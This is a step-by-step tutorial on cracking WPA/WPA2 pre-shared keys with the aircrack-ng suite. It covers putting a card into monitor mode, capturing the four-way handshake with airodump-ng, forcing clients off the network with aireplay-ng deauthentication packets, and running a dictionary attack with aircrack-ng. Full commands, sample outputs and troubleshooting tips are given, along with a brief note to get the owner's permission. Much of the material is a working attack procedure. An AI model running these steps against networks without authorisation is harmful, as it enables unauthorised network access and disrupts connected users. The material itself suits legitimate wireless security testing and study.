Introduction

   This tutorial walks you through cracking WPA/WPA2 networks which use
   pre-shared keys. I recommend you do some background reading to better
   understand what WPA/WPA2 is. The [35]Wiki links page has a [36]WPA/WPA2
   section. The best document describing WPA is [37]Wi-Fi Security - WEP, WPA
   and WPA2. This is the [38]link to download the PDF directly. The [39]WPA
   Packet Capture Explained tutorial is a companion to this tutorial.

   WPA/WPA2 supports many types of authentication beyond pre-shared keys.
   [40]aircrack-ng can ONLY crack pre-shared keys. So make sure
   [41]airodump-ng shows the network as having the authentication type of
   PSK, otherwise, don't bother trying to crack it.

   There is another important difference between cracking WPA/WPA2 and WEP.
   This is the approach used to crack the WPA/WPA2 pre-shared key. Unlike
   WEP, where statistical methods can be used to speed up the cracking
   process, only plain brute force techniques can be used against WPA/WPA2.
   That is, because the key is not static, so collecting IVs like when
   cracking WEP encryption, does not speed up the attack. The only thing that
   does give the information to start an attack is the handshake between
   client and AP. Handshaking is done when the client connects to the
   network. Although not absolutely true, for the purposes of this tutorial,
   consider it true. Since the pre-shared key can be from 8 to 63 characters
   in length, it effectively becomes impossible to crack the pre-shared key.

   The only time you can crack the pre-shared key is if it is a dictionary
   word or relatively short in length. Conversely, if you want to have an
   unbreakable wireless network at home, use WPA/WPA2 and a 63 character
   password composed of random characters including special symbols.

   The impact of having to use a brute force approach is substantial. Because
   it is very compute intensive, a computer can only test 50 to 300 possible
   keys per second depending on the computer CPU. It can take hours, if not
   days, to crunch through a large dictionary. If you are thinking about
   generating your own password list to cover all the permutations and
   combinations of characters and special symbols, check out this [42]brute
   force time calculator first. You will be very surprised at how much time
   is required.

   IMPORTANT This means that the passphrase must be contained in the
   dictionary you are using to break WPA/WPA2. If it is not in the dictionary
   then aircrack-ng will be unable to determine the key.

   There is no difference between cracking WPA or WPA2 networks. The
   authentication methodology is basically the same between them. So the
   techniques you use are identical.

   It is recommended that you experiment with your home wireless access point
   to get familiar with these ideas and techniques. If you do not own a
   particular access point, please remember to get permission from the owner
   prior to playing with it.

   I would like to acknowledge and thank the [43]Aircrack-ng team for
   producing such a great robust tool.

   Please send me any constructive feedback, positive or negative. Additional
   troubleshooting ideas and tips are especially welcome.

Assumptions

   First, this solution assumes:

     • You are using drivers patched for injection. Use the [44]injection
       test to confirm your card can inject.
     • You are physically close enough to send and receive access point and
       wireless client packets. Remember that just because you can receive
       packets from them does not mean you may will be able to transmit
       packets to them. The wireless card strength is typically less then the
       AP strength. So you have to be physically close enough for your
       transmitted packets to reach and be received by both the AP and the
       wireless client. You can confirm that you can communicate with the
       specific AP by following [45]these instructions.
     • You are using v0.9.1 or above of aircrack-ng. If you use a different
       version then some of the command options may have to be changed.

   Ensure all of the above assumptions are true, otherwise the advice that
   follows will not work. In the examples below, you will need to change
   “ath0” to the interface name which is specific to your wireless card.

Equipment used

   In this tutorial, here is what was used:

     • MAC address of PC running aircrack-ng suite: 00:0F:B5:88:AC:82
     • MAC address of the wireless client using WPA2: 00:0F:B5:FD:FB:C2
     • BSSID (MAC address of access point): 00:14:6C:7E:40:80
     • ESSID (Wireless network name): teddy
     • Access point channel: 9
     • Wireless interface: ath0

   You should gather the equivalent information for the network you will be
   working on. Then just change the values in the examples below to the
   specific network.

Solution

  Solution Overview

   The objective is to capture the WPA/WPA2 authentication handshake and then
   use [46]aircrack-ng to crack the pre-shared key.

   This can be done either actively or passively. “Actively” means you will
   accelerate the process by deauthenticating an existing wireless client.
   “Passively” means you simply wait for a wireless client to authenticate to
   the WPA/WPA2 network. The advantage of passive is that you don't actually
   need injection capability and thus the Windows version of aircrack-ng can
   be used.

   Here are the basic steps we will be going through:

    1. Start the wireless interface in monitor mode on the specific AP
       channel
    2. Start airodump-ng on AP channel with filter for bssid to collect
       authentication handshake
    3. Use aireplay-ng to deauthenticate the wireless client
    4. Run aircrack-ng to crack the pre-shared key using the authentication
       handshake

  Step 1 - Start the wireless interface in monitor mode

   The purpose of this step is to put your card into what is called monitor
   mode. Monitor mode is the mode whereby your card can listen to every
   packet in the air. Normally your card will only “hear” packets addressed
   to you. By hearing every packet, we can later capture the WPA/WPA2 4-way
   handshake. As well, it will allow us to optionally deauthenticate a
   wireless client in a later step.

   The exact procedure for enabling monitor mode varies depending on the
   driver you are using. To determine the driver (and the correct procedure
   to follow), run the following command:

  airmon-ng

   On a machine with a Ralink, an Atheros and a Broadcom wireless card
   installed, the system responds:

  Interface       Chipset         Driver

  rausb0          Ralink RT73     rt73
  wlan0           Broadcom        b43 - [phy0]
  wifi0           Atheros         madwifi-ng
  ath0            Atheros         madwifi-ng VAP (parent: wifi0)

   The presence of a [phy0] tag at the end of the driver name is an indicator
   for mac80211, so the Broadcom card is using a mac80211 driver. Note that
   mac80211 is supported only since aircrack-ng v1.0-rc1, and it won't work
   with v0.9.1. Both entries of the Atheros card show “madwifi-ng” as the
   driver - follow the madwifi-ng-specific steps to set up the Atheros card.
   Finally, the Ralink shows neither of these indicators, so it is using an
   ieee80211 driver - see the generic instructions for setting it up.

    Step 1a - Setting up madwifi-ng

   First stop ath0 by entering:

  airmon-ng stop ath0

   The system responds:

  Interface       Chipset         Driver

  wifi0           Atheros         madwifi-ng
  ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)

   Enter “iwconfig” to ensure there are no other athX interfaces. It should
   look similar to this:

  lo        no wireless extensions.

  eth0      no wireless extensions.

  wifi0     no wireless extensions.

   If there are any remaining athX interfaces, then stop each one. When you
   are finished, run “iwconfig” to ensure there are none left.

   Now, enter the following command to start the wireless card on channel 9
   in monitor mode:

  airmon-ng start wifi0 9

   Note: In this command we use “wifi0” instead of our wireless interface of
   “ath0”. This is because the madwifi-ng drivers are being used.

   The system will respond:

  Interface       Chipset         Driver

  wifi0           Atheros         madwifi-ng
  ath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)

   You will notice that “ath0” is reported above as being put into monitor
   mode.

   To confirm the interface is properly setup, enter “iwconfig”.

   The system will respond:

  lo        no wireless extensions.

  wifi0     no wireless extensions.

  eth0      no wireless extensions.

  ath0      IEEE 802.11g  ESSID:""  Nickname:""
         Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82
         Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3
         Retry:off   RTS thr:off   Fragment thr:off
         Encryption key:off
         Power Management:off
         Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm
         Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
         Tx excessive retries:0  Invalid misc:0   Missed beacon:0

   In the response above, you can see that ath0 is in monitor mode, on the
   2.452GHz frequency which is channel 9 and the Access Point shows the MAC
   address of your wireless card. Only the madwifi-ng drivers show the card
   MAC address in the AP field, other drivers do not. So everything is good.
   It is important to confirm all this information prior to proceeding,
   otherwise the following steps will not work properly.

   To match the frequency to the channel, check out:
   [47]http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132
   . This will give you the frequency for each channel.

    Step 1b - Setting up mac80211 drivers

   Unlike madwifi-ng, you do not need to remove the wlan0 interface when
   setting up mac80211 drivers. Instead, use the following command to set up
   your card in monitor mode on channel 9:

  airmon-ng start wlan0 9

   The system responds:

  Interface       Chipset         Driver

  wlan0           Broadcom        b43 - [phy0]
                                  (monitor mode enabled on mon0)

   Notice that airmon-ng enabled monitor-mode on mon0. So, the correct
   interface name to use in later parts of the tutorial is mon0. Wlan0 is
   still in regular (managed) mode, and can be used as usual, provided that
   the AP that wlan0 is connected to is on the same channel as the AP you are
   attacking, and you are not performing any channel-hopping.

   To confirm successful setup, run “iwconfig”. The following output should
   appear:

  lo        no wireless extensions.

  eth0      no wireless extensions.

  wmaster0  no wireless extensions.

  wlan0     IEEE 802.11bg  ESSID:""
            Mode:Managed  Frequency:2.452 GHz  Access Point: Not-Associated
            Tx-Power=0 dBm
            Retry min limit:7   RTS thr:off   Fragment thr=2352 B
            Encryption key:off
            Power Management:off
            Link Quality:0  Signal level:0  Noise level:0
            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
            Tx excessive retries:0  Invalid misc:0   Missed beacon:0

  mon0      IEEE 802.11bg  Mode:Monitor  Frequency:2.452 GHz  Tx-Power=0 dBm
            Retry min limit:7   RTS thr:off   Fragment thr=2352 B
            Encryption key:off
            Power Management:off
            Link Quality:0  Signal level:0  Noise level:0
            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
            Tx excessive retries:0  Invalid misc:0   Missed beacon:0

   Here, mon0 is seen as being in monitor mode, on channel 9 (2.452GHz).
   Unlike madwifi-ng, the monitor interface has no Access Point field at all.
   Also notice that wlan0 is still present, and in managed mode - this is
   normal. Because both interfaces share a common radio, they must always be
   tuned to the same channel - changing the channel on one interface also
   changes channel on the other one.

    Step 1c - Setting up other drivers

   For other (ieee80211-based) drivers, simply run the following command to
   enable monitor mode (replace rausb0 with your interface name):

  airmon-ng start rausb0 9

   The system responds:

  Interface       Chipset         Driver

  rausb0          Ralink          rt73 (monitor mode enabled)

   At this point, the interface should be ready to use.

  Step 2 - Start airodump-ng to collect authentication handshake

   The purpose of this step is to run airodump-ng to capture the 4-way
   authentication handshake for the AP we are interested in.

   Enter:

  airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0

   Where:

     • -c 9 is the channel for the wireless network
     • --bssid 00:14:6C:7E:40:80 is the access point MAC address. This
       eliminates extraneous traffic.
     • -w psk is the file name prefix for the file which will contain the
       IVs.
     • ath0 is the interface name.

   Important: Do NOT use the “--ivs” option. You must capture the full
   packets.

   Here what it looks like if a wireless client is connected to the network:

   CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80

   BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID

   00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy

   BSSID              STATION            PWR  Lost  Packets  Probes

   00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116

   In the screen above, notice the “WPA handshake: 00:14:6C:7E:40:80” in the
   top right-hand corner. This means airodump-ng has successfully captured
   the four-way handshake.

   Here it is with no connected wireless clients:

   CH  9 ][ Elapsed: 4 s ][ 2007-03-24 17:51

   BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID

   00:14:6C:7E:40:80   39 100       51        0    0   9  54  WPA2 CCMP   PSK  teddy

   BSSID              STATION            PWR  Lost  Packets  Probes

    Troubleshooting Tip

   See the [48]Troubleshooting Tips section below for ideas.

   To see if you captured any handshake packets, there are two ways. Watch
   the airodump-ng screen for “ WPA handshake: 00:14:6C:7E:40:80” in the top
   right-hand corner. This means a four-way handshake was successfully
   captured. See just above for an example screenshot.

   Use Wireshark and apply a filter of “eapol”. This displays only eapol
   packets you are interested in. Thus you can see if capture contains
   0,1,2,3 or 4 eapol packets.

  Step 3 - Use aireplay-ng to deauthenticate the wireless client

   This step is optional. If you are patient, you can wait until airodump-ng
   captures a handshake when one or more clients connect to the AP. You only
   perform this step if you opted to actively speed up the process. The other
   constraint is that there must be a wireless client currently associated
   with the AP. If there is no wireless client currently associated with the
   AP, then you have to be patient and wait for one to connect to the AP so
   that a handshake can be captured. Needless to say, if a wireless client
   shows up later and airodump-ng did not capture the handshake, you can
   backtrack and perform this step.

   This step sends a message to the wireless client saying that that it is no
   longer associated with the AP. The wireless client will then hopefully
   reauthenticate with the AP. The reauthentication is what generates the
   4-way authentication handshake we are interested in collecting. This is
   what we use to break the WPA/WPA2 pre-shared key.

   Based on the output of airodump-ng in the previous step, you determine a
   client which is currently connected. You need the MAC address for the
   following. Open another console session and enter:

  aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0

   Where:

     • -0 means deauthentication
     • 1 is the number of deauths to send (you can send multiple if you wish)
     • -a 00:14:6C:7E:40:80 is the MAC address of the access point
     • -c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are
       deauthing
     • ath0 is the interface name

   Here is what the output looks like:

  11:09:28  Sending DeAuth to station   -- STMAC: [00:0F:B5:34:30:30]

   With luck this causes the client to reauthenticate and yield the 4-way
   handshake.

    Troubleshooting Tips

     • The deauthentication packets are sent directly from your PC to the
       clients. So you must be physically close enough to the clients for
       your wireless card transmissions to reach them. To confirm the client
       received the deauthentication packets, use tcpdump or similar to look
       for ACK packets back from the client. If you did not get an ACK packet
       back, then the client did not “hear” the deauthentication packet.

  Step 4 - Run aircrack-ng to crack the pre-shared key

   The purpose of this step is to actually crack the WPA/WPA2 pre-shared key.
   To do this, you need a dictionary of words as input. Basically,
   aircrack-ng takes each word and tests to see if this is in fact the
   pre-shared key.

   There is a small dictionary that comes with aircrack-ng - “password.lst”.
   This file can be found in the “test” directory of the aircrack-ng source
   code. The [49]Wiki FAQ has an extensive list of dictionary sources. You
   can use [50]John the Ripper (JTR) to generate your own list and pipe them
   into [51]aircrack-ng. Using JTR in conjunction with aircrack-ng is beyond
   the scope of this tutorial.

   Open another console session and enter:

 aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap

   Where:

     • -w password.lst is the name of the dictionary file. Remember to
       specify the full path if the file is not located in the same
       directory.
     • *.cap is name of group of files containing the captured packets.
       Notice in this case that we used the wildcard * to include multiple
       files.

   Here is typical output when there are no handshakes found:

  Opening psk-01.cap
  Opening psk-02.cap
  Opening psk-03.cap
  Opening psk-04.cap
  Read 1827 packets.

  No valid WPA handshakes found.

   When this happens you either have to redo step 3 (deauthenticating the
   wireless client) or wait longer if you are using the passive approach.
   When using the passive approach, you have to wait until a wireless client
   authenticates to the AP.

   Here is typical output when handshakes are found:

  Opening psk-01.cap
  Opening psk-02.cap
  Opening psk-03.cap
  Opening psk-04.cap
  Read 1827 packets.

  #  BSSID              ESSID                     Encryption

  1  00:14:6C:7E:40:80  teddy                     WPA (1 handshake)

  Choosing first network as target.

   Now at this point, aircrack-ng will start attempting to crack the
   pre-shared key. Depending on the speed of your CPU and the size of the
   dictionary, this could take a long time, even days.

   Here is what successfully cracking the pre-shared key looks like:

                                Aircrack-ng 0.8

Troubleshooting Tips

  I Cannot Capture the Four-way Handshake!

   It can sometimes be tricky to capture the four-way handshake. Here are
   some troubleshooting tips to address this:

     • Your monitor card must be in the same mode as the both the client and
       Access Point. So, for example, if your card was in “B” mode and the
       client/AP were using “G” mode, then you would not capture the
       handshake. This is especially important for new APs and clients which
       may be “turbo” mode and/or other new standards. Some drivers allow you
       to specify the mode. Also, iwconfig has an option “modulation” that
       can sometimes be used. Do “man iwconfig” to see the options for
       “modulation”. For information, 1, 2, 5.5 and 11Mbit are 'b', 6, 9, 12,
       18, 24, 36, 48, 54Mbit are 'g'.
     • Sometimes you also need to set the monitor-mode card to the same
       speed. IE auto, 1MB, 2MB, 11MB, 54MB, etc.
     • Be sure that your capture card is locked to the same channel as the
       AP. You can do this by specifying “-c <channel of AP>” when you start
       airodump-ng.
     • Be sure there are no connection managers running on your system. This
       can change channels and/or change mode without your knowledge.
     • You are physically close enough to receive both access point and
       wireless client packets. The wireless card strength is typically less
       then the AP strength.
     • Conversely, if you are too close then the received packets can be
       corrupted and discarded. So you cannot be too close.
     • Make sure to use the drivers specified on the wiki. Depending on the
       driver, some old versions do not capture all packets.
     • Ideally, connect and disconnect a wireless client normally to generate
       the handshake.
     • If you use the deauth technique, send the absolute minimum of packets
       to cause the client to reauthenticate. Normally this is a single
       deauth packet. Sending an excessive number of deauth packets may cause
       the client to fail to reconnect and thus it will not generate the
       four-way handshake. As well, use directed deauths, not broadcast. To
       confirm the client received the deauthentication packets, use tcpdump
       or similar to look for ACK packets back from the client. If you did
       not get an ACK packet back, then the client did not “hear” the
       deauthentication packet.
     • Try stopping the radio on the client station then restarting it.
     • Make sure you are not running any other program/process that could
       interfere such as connection managers, Kismet, etc.
     • Review your captured data using the [52]WPA Packet Capture Explained
       tutorial to see if you can identify the problem. Such as missing AP
       packets, missing client packets, etc.

   Unfortunately, sometimes you need to experiment a bit to get your card to
   properly capture the four-way handshake. The point is, if you don't get it
   the first time, have patience and experiment a bit. It can be done!

   Another approach is to use Wireshark to review and analyze your packet
   capture. This can sometimes give you clues as to what is wrong and thus
   some ideas on how to correct it. The [53]WPA Packet Capture Explained
   tutorial is a companion to this tutorial and walks you through what a
   “normal” WPA connection looks like. As well, see the [54]FAQ for detailed
   information on how to use Wireshark.

   In an ideal world, you should use a wireless device dedicated to capturing
   the packets. This is because some drivers such as the RTL8187L driver do
   not capture packets the card itself sends. Also, always use the driver
   versions specified on the wiki. This is because some older versions of the
   drivers such as the RT73 driver did not capture client packets.

   When using Wireshark, the filter “eapol” will quickly display only the
   EAPOL packets. Based on what EAPOL packets are actually in the capture,
   determine your correction plan. For example, if you are missing the client
   packets then try to determine why and how to collect client packets.

   To dig deep into the packet analysis, you must start airodump-ng without a
   BSSID filter and specify the capture of the full packet, not just IVs.
   Needless to say, it must be locked to the AP channel. The reason for
   eliminating the BSSID filter is to ensure all packets including
   acknowledgments are captured. With a BSSID filter, certain packets are
   dropped from the capture.

   Every packet sent by client or AP must be acknowledged. This is done with
   an “acknowledgment” packet which has a destination MAC of the device which
   sent the original packet. If you are trying to deauthenticate a client,
   one thing to check is that you receive the “ack” packet. This confirms the
   client received the deauth packet. Failure to receive the “ack” packet
   likely means that the client is out of transmission range. Thus failure.

   When it comes to analyzing packet captures, it is impossible to provide
   detailed instructions. I have touched on some techniques and areas to look
   at. This is an area which requires effort to build your skills on both
   WPA/WPA2 plus how to use Wireshark.
